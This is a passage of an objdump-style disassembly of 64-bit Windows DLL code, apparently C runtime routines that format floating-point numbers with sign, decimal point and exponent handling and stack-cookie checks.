   180006c3c:	4c 3b f0             	cmp    %rax,%r14
   180006c3f:	77 16                	ja     0x180006c57
   180006c41:	e8 ea 09 00 00       	call   0x180007630
   180006c46:	bb 22 00 00 00       	mov    $0x22,%ebx
   180006c4b:	89 18                	mov    %ebx,(%rax)
   180006c4d:	e8 12 09 00 00       	call   0x180007564
   180006c52:	e9 38 01 00 00       	jmp    0x180006d8f
   180006c57:	80 bc 24 98 00 00 00 	cmpb   $0x0,0x98(%rsp)
   180006c5e:	00 
   180006c5f:	48 8b ac 24 90 00 00 	mov    0x90(%rsp),%rbp
   180006c66:	00 
   180006c67:	74 34                	je     0x180006c9d
   180006c69:	33 db                	xor    %ebx,%ebx
   180006c6b:	83 7d 00 2d          	cmpl   $0x2d,0x0(%rbp)
   180006c6f:	0f 94 c3             	sete   %bl
   180006c72:	45 33 ff             	xor    %r15d,%r15d
   180006c75:	48 03 df             	add    %rdi,%rbx
   180006c78:	85 f6                	test   %esi,%esi
   180006c7a:	41 0f 9f c7          	setg   %r15b
   180006c7e:	45 85 ff             	test   %r15d,%r15d
   180006c81:	74 1a                	je     0x180006c9d
   180006c83:	48 8b cb             	mov    %rbx,%rcx
   180006c86:	e8 95 3a 00 00       	call   0x18000a720
   180006c8b:	49 63 cf             	movslq %r15d,%rcx
   180006c8e:	48 8b d3             	mov    %rbx,%rdx
   180006c91:	4c 8d 40 01          	lea    0x1(%rax),%r8
   180006c95:	48 03 cb             	add    %rbx,%rcx
   180006c98:	e8 53 ea ff ff       	call   0x1800056f0
   180006c9d:	83 7d 00 2d          	cmpl   $0x2d,0x0(%rbp)
   180006ca1:	48 8b d7             	mov    %rdi,%rdx
   180006ca4:	75 07                	jne    0x180006cad
   180006ca6:	c6 07 2d             	movb   $0x2d,(%rdi)
   180006ca9:	48 8d 57 01          	lea    0x1(%rdi),%rdx
   180006cad:	85 f6                	test   %esi,%esi
   180006caf:	7e 1b                	jle    0x180006ccc
   180006cb1:	8a 42 01             	mov    0x1(%rdx),%al
   180006cb4:	88 02                	mov    %al,(%rdx)
   180006cb6:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   180006cbb:	48 ff c2             	inc    %rdx
   180006cbe:	48 8b 88 f0 00 00 00 	mov    0xf0(%rax),%rcx
   180006cc5:	48 8b 01             	mov    (%rcx),%rax
   180006cc8:	8a 08                	mov    (%rax),%cl
   180006cca:	88 0a                	mov    %cl,(%rdx)
   180006ccc:	33 c9                	xor    %ecx,%ecx
   180006cce:	48 8d 1c 32          	lea    (%rdx,%rsi,1),%rbx
   180006cd2:	4c 8d 05 1f ab 00 00 	lea    0xab1f(%rip),%r8        # 0x1800117f8
   180006cd9:	38 8c 24 98 00 00 00 	cmp    %cl,0x98(%rsp)
   180006ce0:	0f 94 c1             	sete   %cl
   180006ce3:	48 03 d9             	add    %rcx,%rbx
   180006ce6:	48 2b fb             	sub    %rbx,%rdi
   180006ce9:	49 83 fe ff          	cmp    $0xffffffffffffffff,%r14
   180006ced:	48 8b cb             	mov    %rbx,%rcx
   180006cf0:	49 8d 14 3e          	lea    (%r14,%rdi,1),%rdx
   180006cf4:	49 0f 44 d6          	cmove  %r14,%rdx
   180006cf8:	e8 1f e8 ff ff       	call   0x18000551c
   180006cfd:	85 c0                	test   %eax,%eax
   180006cff:	0f 85 be 00 00 00    	jne    0x180006dc3
   180006d05:	48 8d 4b 02          	lea    0x2(%rbx),%rcx
   180006d09:	45 85 ed             	test   %r13d,%r13d
   180006d0c:	74 03                	je     0x180006d11
   180006d0e:	c6 03 45             	movb   $0x45,(%rbx)
   180006d11:	48 8b 45 10          	mov    0x10(%rbp),%rax
   180006d15:	80 38 30             	cmpb   $0x30,(%rax)
   180006d18:	74 56                	je     0x180006d70
   180006d1a:	44 8b 45 04          	mov    0x4(%rbp),%r8d
   180006d1e:	41 ff c8             	dec    %r8d
   180006d21:	79 07                	jns    0x180006d2a
   180006d23:	41 f7 d8             	neg    %r8d
   180006d26:	c6 43 01 2d          	movb   $0x2d,0x1(%rbx)
   180006d2a:	41 83 f8 64          	cmp    $0x64,%r8d
   180006d2e:	7c 1b                	jl     0x180006d4b
   180006d30:	b8 1f 85 eb 51       	mov    $0x51eb851f,%eax
   180006d35:	41 f7 e8             	imul   %r8d
   180006d38:	c1 fa 05             	sar    $0x5,%edx
   180006d3b:	8b c2                	mov    %edx,%eax
   180006d3d:	c1 e8 1f             	shr    $0x1f,%eax
   180006d40:	03 d0                	add    %eax,%edx
   180006d42:	00 53 02             	add    %dl,0x2(%rbx)
   180006d45:	6b c2 9c             	imul   $0xffffff9c,%edx,%eax
   180006d48:	44 03 c0             	add    %eax,%r8d
   180006d4b:	41 83 f8 0a          	cmp    $0xa,%r8d
   180006d4f:	7c 1b                	jl     0x180006d6c
   180006d51:	b8 67 66 66 66       	mov    $0x66666667,%eax
   180006d56:	41 f7 e8             	imul   %r8d
   180006d59:	c1 fa 02             	sar    $0x2,%edx
   180006d5c:	8b c2                	mov    %edx,%eax
   180006d5e:	c1 e8 1f             	shr    $0x1f,%eax
   180006d61:	03 d0                	add    %eax,%edx
   180006d63:	00 53 03             	add    %dl,0x3(%rbx)
   180006d66:	6b c2 f6             	imul   $0xfffffff6,%edx,%eax
   180006d69:	44 03 c0             	add    %eax,%r8d
   180006d6c:	44 00 43 04          	add    %r8b,0x4(%rbx)
   180006d70:	f6 05 15 4a 01 00 01 	testb  $0x1,0x14a15(%rip)        # 0x18001b78c
   180006d77:	74 14                	je     0x180006d8d
   180006d79:	80 39 30             	cmpb   $0x30,(%rcx)
   180006d7c:	75 0f                	jne    0x180006d8d
   180006d7e:	48 8d 51 01          	lea    0x1(%rcx),%rdx
   180006d82:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   180006d88:	e8 63 e9 ff ff       	call   0x1800056f0
   180006d8d:	33 db                	xor    %ebx,%ebx
   180006d8f:	80 7c 24 48 00       	cmpb   $0x0,0x48(%rsp)
   180006d94:	74 0c                	je     0x180006da2
   180006d96:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   180006d9b:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   180006da2:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   180006da7:	8b c3                	mov    %ebx,%eax
   180006da9:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   180006dad:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   180006db1:	49 8b 73 30          	mov    0x30(%r11),%rsi
   180006db5:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   180006db9:	49 8b e3             	mov    %r11,%rsp
   180006dbc:	41 5f                	pop    %r15
   180006dbe:	41 5e                	pop    %r14
   180006dc0:	41 5d                	pop    %r13
   180006dc2:	c3                   	ret
   180006dc3:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   180006dc9:	45 33 c9             	xor    %r9d,%r9d
   180006dcc:	45 33 c0             	xor    %r8d,%r8d
   180006dcf:	33 d2                	xor    %edx,%edx
   180006dd1:	33 c9                	xor    %ecx,%ecx
   180006dd3:	e8 ac 07 00 00       	call   0x180007584
   180006dd8:	cc                   	int3
   180006dd9:	cc                   	int3
   180006dda:	cc                   	int3
   180006ddb:	cc                   	int3
   180006ddc:	40 53                	rex push %rbx
   180006dde:	55                   	push   %rbp
   180006ddf:	56                   	push   %rsi
   180006de0:	57                   	push   %rdi
   180006de1:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   180006de8:	48 8b 05 11 22 01 00 	mov    0x12211(%rip),%rax        # 0x180019000
   180006def:	48 33 c4             	xor    %rsp,%rax
   180006df2:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   180006df7:	48 8b 09             	mov    (%rcx),%rcx
   180006dfa:	49 8b d8             	mov    %r8,%rbx
   180006dfd:	48 8b fa             	mov    %rdx,%rdi
   180006e00:	41 8b f1             	mov    %r9d,%esi
   180006e03:	bd 16 00 00 00       	mov    $0x16,%ebp
   180006e08:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   180006e0d:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180006e12:	44 8b cd             	mov    %ebp,%r9d
   180006e15:	e8 2e 3e 00 00       	call   0x18000ac48
   180006e1a:	48 85 ff             	test   %rdi,%rdi
   180006e1d:	75 13                	jne    0x180006e32
   180006e1f:	e8 0c 08 00 00       	call   0x180007630
   180006e24:	89 28                	mov    %ebp,(%rax)
   180006e26:	e8 39 07 00 00       	call   0x180007564
   180006e2b:	8b c5                	mov    %ebp,%eax
   180006e2d:	e9 88 00 00 00       	jmp    0x180006eba
   180006e32:	48 85 db             	test   %rbx,%rbx
   180006e35:	74 e8                	je     0x180006e1f
   180006e37:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   180006e3b:	48 3b da             	cmp    %rdx,%rbx
   180006e3e:	74 1a                	je     0x180006e5a
   180006e40:	33 c0                	xor    %eax,%eax
   180006e42:	83 7c 24 40 2d       	cmpl   $0x2d,0x40(%rsp)
   180006e47:	48 8b d3             	mov    %rbx,%rdx
   180006e4a:	0f 94 c0             	sete   %al
   180006e4d:	48 2b d0             	sub    %rax,%rdx
   180006e50:	33 c0                	xor    %eax,%eax
   180006e52:	85 f6                	test   %esi,%esi
   180006e54:	0f 9f c0             	setg   %al
   180006e57:	48 2b d0             	sub    %rax,%rdx
   180006e5a:	33 c0                	xor    %eax,%eax
   180006e5c:	83 7c 24 40 2d       	cmpl   $0x2d,0x40(%rsp)
   180006e61:	44 8d 46 01          	lea    0x1(%rsi),%r8d
   180006e65:	0f 94 c0             	sete   %al
   180006e68:	33 c9                	xor    %ecx,%ecx
   180006e6a:	85 f6                	test   %esi,%esi
   180006e6c:	0f 9f c1             	setg   %cl
   180006e6f:	48 03 c7             	add    %rdi,%rax
   180006e72:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   180006e77:	48 03 c8             	add    %rax,%rcx
   180006e7a:	e8 8d 3a 00 00       	call   0x18000a90c
   180006e7f:	85 c0                	test   %eax,%eax
   180006e81:	74 05                	je     0x180006e88
   180006e83:	c6 07 00             	movb   $0x0,(%rdi)
   180006e86:	eb 32                	jmp    0x180006eba
   180006e88:	48 8b 84 24 d8 00 00 	mov    0xd8(%rsp),%rax
   180006e8f:	00 
   180006e90:	44 8b 8c 24 d0 00 00 	mov    0xd0(%rsp),%r9d
   180006e97:	00 
   180006e98:	44 8b c6             	mov    %esi,%r8d
   180006e9b:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180006ea0:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   180006ea5:	48 8b d3             	mov    %rbx,%rdx
   180006ea8:	48 8b cf             	mov    %rdi,%rcx
   180006eab:	c6 44 24 28 00       	movb   $0x0,0x28(%rsp)
   180006eb0:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180006eb5:	e8 26 fd ff ff       	call   0x180006be0
   180006eba:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   180006ebf:	48 33 cc             	xor    %rsp,%rcx
   180006ec2:	e8 69 e3 ff ff       	call   0x180005230
   180006ec7:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   180006ece:	5f                   	pop    %rdi
   180006ecf:	5e                   	pop    %rsi
   180006ed0:	5d                   	pop    %rbp
   180006ed1:	5b                   	pop    %rbx
   180006ed2:	c3                   	ret
   180006ed3:	cc                   	int3
   180006ed4:	48 8b c4             	mov    %rsp,%rax
   180006ed7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180006edb:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180006edf:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180006ee3:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180006ee7:	41 56                	push   %r14
   180006ee9:	48 83 ec 40          	sub    $0x40,%rsp
   180006eed:	41 8b 59 04          	mov    0x4(%r9),%ebx
   180006ef1:	48 8b f2             	mov    %rdx,%rsi
   180006ef4:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
   180006ef9:	48 8b f9             	mov    %rcx,%rdi
   180006efc:	48 8d 48 d8          	lea    -0x28(%rax),%rcx
   180006f00:	49 8b e9             	mov    %r9,%rbp
   180006f03:	ff cb                	dec    %ebx
   180006f05:	45 8b f0             	mov    %r8d,%r14d
   180006f08:	e8 e7 ef ff ff       	call   0x180005ef4
   180006f0d:	48 85 ff             	test   %rdi,%rdi
   180006f10:	74 05                	je     0x180006f17
   180006f12:	48 85 f6             	test   %rsi,%rsi
   180006f15:	75 16                	jne    0x180006f2d
   180006f17:	e8 14 07 00 00       	call   0x180007630
   180006f1c:	bb 16 00 00 00       	mov    $0x16,%ebx
   180006f21:	89 18                	mov    %ebx,(%rax)
   180006f23:	e8 3c 06 00 00       	call   0x180007564
   180006f28:	e9 d8 00 00 00       	jmp    0x180007005
   180006f2d:	80 7c 24 70 00       	cmpb   $0x0,0x70(%rsp)
   180006f32:	74 1a                	je     0x180006f4e
   180006f34:	41 3b de             	cmp    %r14d,%ebx
   180006f37:	75 15                	jne    0x180006f4e
   180006f39:	33 c0                	xor    %eax,%eax
   180006f3b:	83 7d 00 2d          	cmpl   $0x2d,0x0(%rbp)
   180006f3f:	48 63 cb             	movslq %ebx,%rcx
   180006f42:	0f 94 c0             	sete   %al
   180006f45:	48 03 c7             	add    %rdi,%rax
   180006f48:	66 c7 04 01 30 00    	movw   $0x30,(%rcx,%rax,1)
   180006f4e:	83 7d 00 2d          	cmpl   $0x2d,0x0(%rbp)
   180006f52:	75 06                	jne    0x180006f5a
   180006f54:	c6 07 2d             	movb   $0x2d,(%rdi)
   180006f57:	48 ff c7             	inc    %rdi
   180006f5a:	83 7d 04 00          	cmpl   $0x0,0x4(%rbp)
   180006f5e:	7f 20                	jg     0x180006f80
   180006f60:	48 8b cf             	mov    %rdi,%rcx
   180006f63:	e8 b8 37 00 00       	call   0x18000a720
   180006f68:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
   180006f6c:	48 8b d7             	mov    %rdi,%rdx
   180006f6f:	4c 8d 40 01          	lea    0x1(%rax),%r8
   180006f73:	e8 78 e7 ff ff       	call   0x1800056f0
   180006f78:	c6 07 30             	movb   $0x30,(%rdi)
   180006f7b:	48 ff c7             	inc    %rdi
   180006f7e:	eb 07                	jmp    0x180006f87
   180006f80:	48 63 45 04          	movslq 0x4(%rbp),%rax
   180006f84:	48 03 f8             	add    %rax,%rdi
   180006f87:	45 85 f6             	test   %r14d,%r14d
   180006f8a:	7e 77                	jle    0x180007003
   180006f8c:	48 8b cf             	mov    %rdi,%rcx
   180006f8f:	48 8d 77 01          	lea    0x1(%rdi),%rsi
   180006f93:	e8 88 37 00 00       	call   0x18000a720
   180006f98:	48 8b d7             	mov    %rdi,%rdx
   180006f9b:	48 8b ce             	mov    %rsi,%rcx
   180006f9e:	4c 8d 40 01          	lea    0x1(%rax),%r8
   180006fa2:	e8 49 e7 ff ff       	call   0x1800056f0
   180006fa7:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180006fac:	48 8b 88 f0 00 00 00 	mov    0xf0(%rax),%rcx
   180006fb3:	48 8b 01             	mov    (%rcx),%rax
   180006fb6:	8a 08                	mov    (%rax),%cl
   180006fb8:	88 0f                	mov    %cl,(%rdi)
   180006fba:	8b 5d 04             	mov    0x4(%rbp),%ebx
   180006fbd:	85 db                	test   %ebx,%ebx
   180006fbf:	79 42                	jns    0x180007003
   180006fc1:	f7 db                	neg    %ebx
   180006fc3:	80 7c 24 70 00       	cmpb   $0x0,0x70(%rsp)
   180006fc8:	75 0b                	jne    0x180006fd5
   180006fca:	8b c3                	mov    %ebx,%eax
   180006fcc:	41 8b de             	mov    %r14d,%ebx
   180006fcf:	44 3b f0             	cmp    %eax,%r14d
   180006fd2:	0f 4d d8             	cmovge %eax,%ebx
   180006fd5:	85 db                	test   %ebx,%ebx
   180006fd7:	74 1a                	je     0x180006ff3
   180006fd9:	48 8b ce             	mov    %rsi,%rcx
   180006fdc:	e8 3f 37 00 00       	call   0x18000a720
   180006fe1:	48 63 cb             	movslq %ebx,%rcx
   180006fe4:	48 8b d6             	mov    %rsi,%rdx
   180006fe7:	4c 8d 40 01          	lea    0x1(%rax),%r8
   180006feb:	48 03 ce             	add    %rsi,%rcx
   180006fee:	e8 fd e6 ff ff       	call   0x1800056f0
   180006ff3:	4c 63 c3             	movslq %ebx,%r8
   180006ff6:	ba 30 00 00 00       	mov    $0x30,%edx
   180006ffb:	48 8b ce             	mov    %rsi,%rcx
   180006ffe:	e8 5d e2 ff ff       	call   0x180005260
   180007003:	33 db                	xor    %ebx,%ebx
   180007005:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   18000700a:	74 0c                	je     0x180007018
   18000700c:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180007011:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   180007018:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   18000701d:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   180007022:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   180007027:	8b c3                	mov    %ebx,%eax
   180007029:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   18000702e:	48 83 c4 40          	add    $0x40,%rsp
   180007032:	41 5e                	pop    %r14
   180007034:	c3                   	ret
   180007035:	cc                   	int3
   180007036:	cc                   	int3
   180007037:	cc                   	int3
   180007038:	40 53                	rex push %rbx
   18000703a:	55                   	push   %rbp
   18000703b:	56                   	push   %rsi
   18000703c:	57                   	push   %rdi
   18000703d:	48 83 ec 78          	sub    $0x78,%rsp
   180007041:	48 8b 05 b8 1f 01 00 	mov    0x11fb8(%rip),%rax        # 0x180019000
   180007048:	48 33 c4             	xor    %rsp,%rax
   18000704b:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   180007050:	48 8b 09             	mov    (%rcx),%rcx
   180007053:	49 8b d8             	mov    %r8,%rbx
   180007056:	48 8b fa             	mov    %rdx,%rdi
   180007059:	41 8b f1             	mov    %r9d,%esi
   18000705c:	bd 16 00 00 00       	mov    $0x16,%ebp
   180007061:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   180007066:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   18000706b:	44 8b cd             	mov    %ebp,%r9d
   18000706e:	e8 d5 3b 00 00       	call   0x18000ac48
   180007073:	48 85 ff             	test   %rdi,%rdi
   180007076:	75 10                	jne    0x180007088
   180007078:	e8 b3 05 00 00       	call   0x180007630
   18000707d:	89 28                	mov    %ebp,(%rax)
   18000707f:	e8 e0 04 00 00       	call   0x180007564
   180007084:	8b c5                	mov    %ebp,%eax
   180007086:	eb 6b                	jmp    0x1800070f3
   180007088:	48 85 db             	test   %rbx,%rbx
   18000708b:	74 eb                	je     0x180007078
   18000708d:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   180007091:	48 3b da             	cmp    %rdx,%rbx
   180007094:	74 10                	je     0x1800070a6
   180007096:	33 c0                	xor    %eax,%eax
   180007098:	83 7c 24 30 2d       	cmpl   $0x2d,0x30(%rsp)
   18000709d:	48 8b d3             	mov    %rbx,%rdx
   1800070a0:	0f 94 c0             	sete   %al
   1800070a3:	48 2b d0             	sub    %rax,%rdx
   1800070a6:	44 8b 44 24 34       	mov    0x34(%rsp),%r8d
   1800070ab:	33 c9                	xor    %ecx,%ecx
   1800070ad:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   1800070b2:	44 03 c6             	add    %esi,%r8d
   1800070b5:	83 7c 24 30 2d       	cmpl   $0x2d,0x30(%rsp)
   1800070ba:	0f 94 c1             	sete   %cl
   1800070bd:	48 03 cf             	add    %rdi,%rcx
   1800070c0:	e8 47 38 00 00       	call   0x18000a90c
   1800070c5:	85 c0                	test   %eax,%eax
   1800070c7:	74 05                	je     0x1800070ce
   1800070c9:	c6 07 00             	movb   $0x0,(%rdi)
   1800070cc:	eb 25                	jmp    0x1800070f3
   1800070ce:	48 8b 84 24 c0 00 00 	mov    0xc0(%rsp),%rax
   1800070d5:	00 
   1800070d6:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   1800070db:	44 8b c6             	mov    %esi,%r8d
   1800070de:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1800070e3:	48 8b d3             	mov    %rbx,%rdx
   1800070e6:	48 8b cf             	mov    %rdi,%rcx
   1800070e9:	c6 44 24 20 00       	movb   $0x0,0x20(%rsp)
   1800070ee:	e8 e1 fd ff ff       	call   0x180006ed4
   1800070f3:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1800070f8:	48 33 cc             	xor    %rsp,%rcx
   1800070fb:	e8 30 e1 ff ff       	call   0x180005230
   180007100:	48 83 c4 78          	add    $0x78,%rsp
   180007104:	5f                   	pop    %rdi
   180007105:	5e                   	pop    %rsi
   180007106:	5d                   	pop    %rbp
   180007107:	5b                   	pop    %rbx
   180007108:	c3                   	ret
   180007109:	cc                   	int3
   18000710a:	cc                   	int3
   18000710b:	cc                   	int3
   18000710c:	40 53                	rex push %rbx
   18000710e:	55                   	push   %rbp
   18000710f:	56                   	push   %rsi
   180007110:	57                   	push   %rdi
   180007111:	41 56                	push   %r14
   180007113:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   18000711a:	48 8b 05 df 1e 01 00 	mov    0x11edf(%rip),%rax        # 0x180019000
   180007121:	48 33 c4             	xor    %rsp,%rax
   180007124:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   180007129:	48 8b 09             	mov    (%rcx),%rcx
   18000712c:	49 8b f8             	mov    %r8,%rdi
   18000712f:	48 8b f2             	mov    %rdx,%rsi
   180007132:	41 8b e9             	mov    %r9d,%ebp
   180007135:	bb 16 00 00 00       	mov    $0x16,%ebx
   18000713a:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   18000713f:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180007144:	44 8b cb             	mov    %ebx,%r9d
   180007147:	e8 fc 3a 00 00       	call   0x18000ac48
   18000714c:	48 85 f6             	test   %rsi,%rsi
   18000714f:	75 13                	jne    0x180007164
   180007151:	e8 da 04 00 00       	call   0x180007630
   180007156:	89 18                	mov    %ebx,(%rax)
   180007158:	e8 07 04 00 00       	call   0x180007564
   18000715d:	8b c3                	mov    %ebx,%eax
   18000715f:	e9 c1 00 00 00       	jmp    0x180007225
   180007164:	48 85 ff             	test   %rdi,%rdi
   180007167:	74 e8                	je     0x180007151
   180007169:	44 8b 74 24 44       	mov    0x44(%rsp),%r14d
   18000716e:	33 c0                	xor    %eax,%eax
   180007170:	41 ff ce             	dec    %r14d
   180007173:	83 7c 24 40 2d       	cmpl   $0x2d,0x40(%rsp)
   180007178:	0f 94 c0             	sete   %al
   18000717b:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   18000717f:	48 8d 1c 30          	lea    (%rax,%rsi,1),%rbx
   180007183:	48 3b fa             	cmp    %rdx,%rdi
   180007186:	74 06                	je     0x18000718e
   180007188:	48 8b d7             	mov    %rdi,%rdx
   18000718b:	48 2b d0             	sub    %rax,%rdx
   18000718e:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   180007193:	44 8b c5             	mov    %ebp,%r8d
   180007196:	48 8b cb             	mov    %rbx,%rcx
   180007199:	e8 6e 37 00 00       	call   0x18000a90c
   18000719e:	85 c0                	test   %eax,%eax
   1800071a0:	74 05                	je     0x1800071a7
   1800071a2:	c6 06 00             	movb   $0x0,(%rsi)
   1800071a5:	eb 7e                	jmp    0x180007225
   1800071a7:	8b 44 24 44          	mov    0x44(%rsp),%eax
   1800071ab:	ff c8                	dec    %eax
   1800071ad:	44 3b f0             	cmp    %eax,%r14d
   1800071b0:	0f 9c c1             	setl   %cl
   1800071b3:	83 f8 fc             	cmp    $0xfffffffc,%eax
   1800071b6:	7c 3b                	jl     0x1800071f3
   1800071b8:	3b c5                	cmp    %ebp,%eax
   1800071ba:	7d 37                	jge    0x1800071f3
   1800071bc:	84 c9                	test   %cl,%cl
   1800071be:	74 0c                	je     0x1800071cc
   1800071c0:	8a 03                	mov    (%rbx),%al
   1800071c2:	48 ff c3             	inc    %rbx
   1800071c5:	84 c0                	test   %al,%al
   1800071c7:	75 f7                	jne    0x1800071c0
   1800071c9:	88 43 fe             	mov    %al,-0x2(%rbx)
   1800071cc:	48 8b 84 24 d8 00 00 	mov    0xd8(%rsp),%rax
   1800071d3:	00 
   1800071d4:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1800071d9:	44 8b c5             	mov    %ebp,%r8d
   1800071dc:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1800071e1:	48 8b d7             	mov    %rdi,%rdx
   1800071e4:	48 8b ce             	mov    %rsi,%rcx
   1800071e7:	c6 44 24 20 01       	movb   $0x1,0x20(%rsp)
   1800071ec:	e8 e3 fc ff ff       	call   0x180006ed4
   1800071f1:	eb 32                	jmp    0x180007225
   1800071f3:	48 8b 84 24 d8 00 00 	mov    0xd8(%rsp),%rax
   1800071fa:	00 
   1800071fb:	44 8b 8c 24 d0 00 00 	mov    0xd0(%rsp),%r9d
   180007202:	00 
   180007203:	44 8b c5             	mov    %ebp,%r8d
   180007206:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   18000720b:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   180007210:	48 8b d7             	mov    %rdi,%rdx
   180007213:	48 8b ce             	mov    %rsi,%rcx
   180007216:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   18000721b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180007220:	e8 bb f9 ff ff       	call   0x180006be0
   180007225:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   18000722a:	48 33 cc             	xor    %rsp,%rcx
   18000722d:	e8 fe df ff ff       	call   0x180005230
   180007232:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   180007239:	41 5e                	pop    %r14
   18000723b:	5f                   	pop    %rdi
   18000723c:	5e                   	pop    %rsi
   18000723d:	5d                   	pop    %rbp
   18000723e:	5b                   	pop    %rbx
   18000723f:	c3                   	ret
   180007240:	33 d2                	xor    %edx,%edx
   180007242:	e9 01 00 00 00       	jmp    0x180007248
   180007247:	cc                   	int3
   180007248:	40 53                	rex push %rbx
   18000724a:	48 83 ec 40          	sub    $0x40,%rsp
   18000724e:	48 8b d9             	mov    %rcx,%rbx
   180007251:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180007256:	e8 99 ec ff ff       	call   0x180005ef4
   18000725b:	8a 0b                	mov    (%rbx),%cl
   18000725d:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   180007262:	84 c9                	test   %cl,%cl
   180007264:	74 19                	je     0x18000727f
   180007266:	49 8b 80 f0 00 00 00 	mov    0xf0(%r8),%rax
   18000726d:	48 8b 10             	mov    (%rax),%rdx
   180007270:	8a 02                	mov    (%rdx),%al
   180007272:	3a c8                	cmp    %al,%cl
   180007274:	74 09                	je     0x18000727f
   180007276:	48 ff c3             	inc    %rbx
   180007279:	8a 0b                	mov    (%rbx),%cl
   18000727b:	84 c9                	test   %cl,%cl
   18000727d:	75 f3                	jne    0x180007272
   18000727f:	8a 03                	mov    (%rbx),%al
   180007281:	48 ff c3             	inc    %rbx
   180007284:	84 c0                	test   %al,%al
   180007286:	74 3d                	je     0x1800072c5
   180007288:	eb 09                	jmp    0x180007293
   18000728a:	2c 45                	sub    $0x45,%al
   18000728c:	a8 df                	test   $0xdf,%al
   18000728e:	74 09                	je     0x180007299
   180007290:	48 ff c3             	inc    %rbx
   180007293:	8a 03                	mov    (%rbx),%al
   180007295:	84 c0                	test   %al,%al
   180007297:	75 f1                	jne    0x18000728a
   180007299:	48 8b d3             	mov    %rbx,%rdx
   18000729c:	48 ff cb             	dec    %rbx
   18000729f:	80 3b 30             	cmpb   $0x30,(%rbx)
   1800072a2:	74 f8                	je     0x18000729c
   1800072a4:	49 8b 80 f0 00 00 00 	mov    0xf0(%r8),%rax
   1800072ab:	48 8b 08             	mov    (%rax),%rcx
   1800072ae:	8a 01                	mov    (%rcx),%al
   1800072b0:	38 03                	cmp    %al,(%rbx)
   1800072b2:	75 03                	jne    0x1800072b7
   1800072b4:	48 ff cb             	dec    %rbx
   1800072b7:	8a 02                	mov    (%rdx),%al
   1800072b9:	48 ff c3             	inc    %rbx
   1800072bc:	48 ff c2             	inc    %rdx
   1800072bf:	88 03                	mov    %al,(%rbx)
   1800072c1:	84 c0                	test   %al,%al
   1800072c3:	75 f2                	jne    0x1800072b7
   1800072c5:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   1800072ca:	74 0c                	je     0x1800072d8
   1800072cc:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   1800072d1:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   1800072d8:	48 83 c4 40          	add    $0x40,%rsp
   1800072dc:	5b                   	pop    %rbx
   1800072dd:	c3                   	ret
   1800072de:	cc                   	int3
   1800072df:	cc                   	int3
   1800072e0:	45 33 c9             	xor    %r9d,%r9d
   1800072e3:	e9 00 00 00 00       	jmp    0x1800072e8
   1800072e8:	40 53                	rex push %rbx
   1800072ea:	48 83 ec 30          	sub    $0x30,%rsp
   1800072ee:	49 8b c0             	mov    %r8,%rax
   1800072f1:	48 8b da             	mov    %rdx,%rbx
   1800072f4:	4d 8b c1             	mov    %r9,%r8
   1800072f7:	48 8b d0             	mov    %rax,%rdx
   1800072fa:	85 c9                	test   %ecx,%ecx
   1800072fc:	74 14                	je     0x180007312
   1800072fe:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180007303:	e8 a0 37 00 00       	call   0x18000aaa8
